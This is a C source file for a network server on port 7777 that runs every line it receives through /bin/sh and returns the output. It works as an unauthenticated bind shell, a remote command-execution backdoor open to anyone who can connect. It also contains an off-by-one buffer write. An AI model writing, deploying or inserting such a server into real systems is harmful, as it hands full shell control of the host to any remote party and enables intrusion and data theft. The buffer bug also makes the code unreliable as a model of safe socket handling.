#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>

#define SERVER_PORT 7777
#define MAX_CONNECTIONS 10

void process_client(int client_socket, struct sockaddr_in* client_addr) {
    char buffer[4096];
    int bytes_received;

    char client_ip[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &(client_addr->sin_addr), client_ip, INET_ADDRSTRLEN);
    int client_port = ntohs(client_addr->sin_port);

    printf("Client (%s:%d) connected to the server successfully\n", client_ip, client_port);

    while (1) {
        bytes_received = recv(client_socket, buffer, sizeof(buffer), 0);
        if (bytes_received <= 0) {
            break;
        }

        buffer[bytes_received] = '\0';

        if (strcmp(buffer, "quit\n") == 0) {
            // Client requests to quit
            break;
        }

        // Fork a child process to execute the command
        pid_t pid = fork();
        if (pid == 0) {
            // In the child process
            close(STDOUT_FILENO); // Close standard output
            dup(client_socket);   // Redirect standard output to the client socket
            execl("/bin/sh", "sh", "-c", buffer, (char *)0);
            exit(0); // Terminate the child process
        } else if (pid > 0) {
            // In the parent process
            int status;
            waitpid(pid, &status, 0); // Wait for the child process to finish
        }
    }

    close(client_socket);
}

int main() {
    int custom_server_socket, client_socket;
    struct sockaddr_in custom_server_addr, client_addr;
    socklen_t client_addr_len = sizeof(client_addr);

    // Create the socket
    custom_server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (custom_server_socket == -1) {
        perror("socket");
        exit(1);
    }

    custom_server_addr.sin_family = AF_INET;
    custom_server_addr.sin_addr.s_addr = INADDR_ANY;
    custom_server_addr.sin_port = htons(SERVER_PORT);

    // Bind the socket to the specified address and port
    if (bind(custom_server_socket, (struct sockaddr *)&custom_server_addr, sizeof(custom_server_addr)) == -1) {
        perror("bind");
        exit(1);
    }

    // Listen for incoming connections
    if (listen(custom_server_socket, MAX_CONNECTIONS) == -1) {
        perror("listen");
        exit(1);
    }

    printf("Custom Server listening on port %d...\n", SERVER_PORT);

    while (1) {
        // Accept a connection from a client
        client_socket = accept(custom_server_socket, (struct sockaddr *)&client_addr, &client_addr_len);
        if (client_socket == -1) {
            perror("accept");
            continue;
        }

        // Fork a child process to handle the client
        if (fork() == 0) {
            // In the child process
            close(custom_server_socket);  // Close the server socket in the child process
            process_client(client_socket, &client_addr);  // Handle the client
            exit(0);  // Terminate the child process
        }

        // In the parent process
        close(client_socket);  // Close the client socket in the parent process
    }

    // Close the server socket
    close(custom_server_socket);

    return 0;
}
